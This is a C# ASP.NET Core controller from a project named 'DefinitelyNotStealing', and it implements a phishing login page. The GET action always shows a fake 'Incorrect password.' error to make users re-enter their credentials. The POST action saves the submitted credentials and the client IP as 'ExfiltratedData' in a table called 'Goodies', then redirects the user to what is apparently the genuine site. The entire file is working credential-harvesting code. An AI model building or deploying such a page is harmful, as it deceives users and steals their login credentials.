using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using DefinitelyNotStealing.Data;
using DefinitelyNotStealing.Models;
using DefinitelyNotStealing.Models.Entities;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;

namespace DefinitelyNotStealing.Controllers;

public class AuthController : Controller
{
    private readonly AppDataContext _ctx;
    private readonly IHttpContextAccessor _httpContextAccessor;

    public AuthController(AppDataContext context, IHttpContextAccessor httpContextAccessor)
    {
        _ctx = context;
        _httpContextAccessor = httpContextAccessor;
    }

    [HttpGet]
    public IActionResult Login()
    {
        ModelState.AddModelError("", "Incorrect password.");
        return View(new LoginViewModel());
    }

    [HttpPost]
    public async Task<IActionResult> Login(LoginViewModel loginViewModel)
    {
        await _ctx.Goodies.AddAsync(
            new ExfiltratedData
            {
                ClientIP = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString(),
                CorrelationId = Guid.NewGuid(),
                Data = JsonConvert.SerializeObject(loginViewModel),
                DataType = "Login credentials - from redirect",
                Timestamp = DateTime.UtcNow
            }
        );
        await _ctx.SaveChangesAsync();
        return Redirect("https://localhost:5001/");
    }
}
